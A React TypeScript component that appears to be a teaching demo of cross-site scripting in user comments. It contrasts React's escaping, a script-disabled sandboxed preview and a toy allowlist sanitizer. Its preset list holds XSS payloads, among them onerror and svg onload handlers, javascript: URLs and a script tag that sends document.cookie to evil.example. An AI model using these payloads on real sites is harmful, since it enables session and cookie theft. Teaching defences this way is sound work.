import { useMemo, useState } from 'react'
import { Note } from './common'

const PRESETS: { label: string; html: string }[] = [
  { label: 'img onerror', html: `Nice post! <img src=x onerror="alert('stolen: '+document.cookie)"> <b>bold</b> <a href="javascript:alert(1)">click</a>` },
  { label: 'script tag', html: `Great article <script>fetch('https://evil.example/?c='+document.cookie)</script><i>really</i>` },
  { label: 'javascript: URL', html: `See <a href="  JaVaScript:alert(document.domain)">my profile</a> and <a href="https://react.dev">docs</a>` },
  { label: 'svg onload', html: `<svg onload="alert('xss')"><circle r="10"></circle></svg> Cute icon!` },
  { label: 'harmless formatting', html: `<p>I <strong>love</strong> this. <em>Tips:</em></p><ul><li>use <code>key</code></li><li>read <a href="https://react.dev">react.dev</a></li></ul>` },
]

const ALLOWED = new Set(['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li', 'code'])
const DROP_WITH_CONTENT = new Set(['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'template', 'noscript'])
// Strip whitespace/control chars browsers ignore inside URL schemes ("java\tscript:").
const isJsUrl = (v: string) => /^javascript:/i.test(v.replace(/[\u0000- ]/g, ''))

function parse(html: string) {
  // DOMParser documents have no browsing context: nothing loads or runs.
  return new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html')
}

function detect(html: string) {
  const found: string[] = []
  for (const el of parse(html).body.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase()
    if (tag === 'script') found.push(`<script> tag: ${(el.textContent ?? '').slice(0, 50)}`)
    for (const a of el.attributes) {
      if (a.name.startsWith('on')) found.push(`<${tag} ${a.name}="${a.value.slice(0, 50)}"> event handler`)
      if (['href', 'src', 'xlink:href', 'action', 'formaction'].includes(a.name) && isJsUrl(a.value)) found.push(`<${tag} ${a.name}="${a.value.trim().slice(0, 50)}"> javascript: URL`)
    }
  }
  return found
}

function sanitize(html: string) {
  const doc = parse(html)
  const removed: string[] = []
  const walk = (node: Element) => {
    for (const child of [...node.children]) {
      const tag = child.tagName.toLowerCase()
      if (DROP_WITH_CONTENT.has(tag)) {
        removed.push(`<${tag}> (with content)`)
        child.remove()
        continue
      }
      walk(child)
      if (!ALLOWED.has(tag)) {
        removed.push(`<${tag}> (unwrapped, text kept)`)
        child.replaceWith(...child.childNodes)
        continue
      }
      for (const a of [...child.attributes]) {
        const okHref = tag === 'a' && a.name === 'href' && /^https?:\/\//i.test(a.value.trim())
        if (!okHref) {
          removed.push(`${a.name}="${a.value.slice(0, 40)}" on <${tag}>`)
          child.removeAttribute(a.name)
        }
      }
      if (tag === 'a' && child.hasAttribute('href')) {
        child.setAttribute('rel', 'noopener noreferrer')
        child.setAttribute('target', '_blank')
      }
    }
  }
  walk(doc.body)
  return { html: doc.body.innerHTML, removed }
}

const paneTitle = { margin: '0 0 6px', fontSize: '0.8rem' } as const

export default function Xss() {
  const [comment, setComment] = useState(PRESETS[0]!.html)
  const dangers = useMemo(() => detect(comment), [comment])
  const clean = useMemo(() => sanitize(comment), [comment])

  return (
    <div>
      <div className="viz-controls">
        <span className="subtle">Payload:</span>
        {PRESETS.map(p => (
          <button key={p.label} className="btn sm" onClick={() => setComment(p.html)} aria-pressed={comment === p.html}>
            {p.label}
          </button>
        ))}
      </div>
      <div className="viz-stage">
        <label htmlFor="xss-comment" className="subtle" style={{ fontSize: '0.8rem' }}>
          User comment (from the database, i.e. attacker-controlled)
        </label>
        <textarea
          id="xss-comment"
          value={comment}
          onChange={e => setComment(e.target.value)}
          rows={3}
          spellCheck={false}
          style={{ width: '100%', boxSizing: 'border-box', fontFamily: 'var(--mono)', fontSize: '0.8rem', marginTop: 4 }}
        />
        <div className="grid cols-3" style={{ gap: 10, marginTop: 10 }}>
          <div className="lane" style={{ minWidth: 0 }}>
            <h4 style={paneTitle}>
              1. React default <code>{'{comment}'}</code> <span className="pill ok">safe</span>
            </h4>
            <div style={{ fontSize: '0.85rem', overflowWrap: 'anywhere' }}>{comment}</div>
            <p className="subtle" style={{ fontSize: '0.75rem' }}>React escapes strings: tags show up as text, nothing is parsed as HTML.</p>
          </div>

          <div className="lane" style={{ minWidth: 0, borderColor: dangers.length ? 'var(--bad)' : undefined }}>
            <h4 style={paneTitle}>
              2. <code>dangerouslySetInnerHTML</code> (unsanitized) {dangers.length > 0 && <span className="pill" style={{ background: 'var(--bad-soft)', color: 'var(--bad)' }}>dangerous</span>}
            </h4>
            {/* Empty sandbox: no scripts, no same-origin access. The demo itself never runs the payload. */}
            <iframe sandbox="" srcDoc={comment} title="Unsanitized HTML preview (sandboxed, scripts disabled)" style={{ width: '100%', height: 90, border: '1px dashed var(--border)', borderRadius: 6, background: 'var(--bg-sunk)' }} />
            <p style={{ fontSize: '0.75rem', color: 'var(--bad)', fontWeight: 600, margin: '6px 0' }}>
              Shown in a script-disabled sandbox here. In a real app this code WOULD run with your users' cookies and session.
            </p>
            {dangers.length === 0 ? (
              <span className="subtle" style={{ fontSize: '0.75rem' }}>No script vectors detected.</span>
            ) : (
              <ul style={{ margin: 0, paddingLeft: 16, fontSize: '0.75rem', fontFamily: 'var(--mono)', color: 'var(--bad)', overflowWrap: 'anywhere' }}>
                {dangers.map((d, i) => (
                  <li key={i}>{d}</li>
                ))}
              </ul>
            )}
          </div>

          <div className="lane" style={{ minWidth: 0 }}>
            <h4 style={paneTitle}>
              3. Sanitized (allowlist) <span className="pill ok">safe</span>
            </h4>
            <div style={{ fontSize: '0.85rem', overflowWrap: 'anywhere' }} dangerouslySetInnerHTML={{ __html: clean.html }} />
            <div className="subtle" style={{ fontSize: '0.75rem', marginTop: 6 }}>Removed:</div>
            {clean.removed.length === 0 ? (
              <span className="subtle" style={{ fontSize: '0.75rem' }}>nothing</span>
            ) : (
              <ul style={{ margin: 0, paddingLeft: 16, fontSize: '0.75rem', fontFamily: 'var(--mono)', color: 'var(--warn)', overflowWrap: 'anywhere' }}>
                {clean.removed.map((r, i) => (
                  <li key={i}>{r}</li>
                ))}
              </ul>
            )}
            <div className="subtle" style={{ fontSize: '0.7rem', marginTop: 6, fontFamily: 'var(--mono)', overflowWrap: 'anywhere' }}>{clean.html}</div>
          </div>
        </div>
      </div>
      <Note>
        {dangers.length
          ? `This payload contains **${dangers.length}** script vector${dangers.length > 1 ? 's' : ''}. JSX \`{comment}\` is safe by default; \`dangerouslySetInnerHTML\` hands the string straight to the browser's HTML parser. The allowlist keeps only \`b i em strong a p br ul li code\`, strips every \`on*\` attribute and allows \`href\` only for http/https. This toy sanitizer is for learning: in production use a battle-tested library such as **DOMPurify**.`
          : 'Harmless formatting survives the allowlist intact, so users still get bold, links and lists. Prefer rendering plain text or Markdown; reach for `dangerouslySetInnerHTML` only with a real sanitizer like **DOMPurify** (and ideally a Content-Security-Policy as a second line of defence).'}
      </Note>
    </div>
  )
}
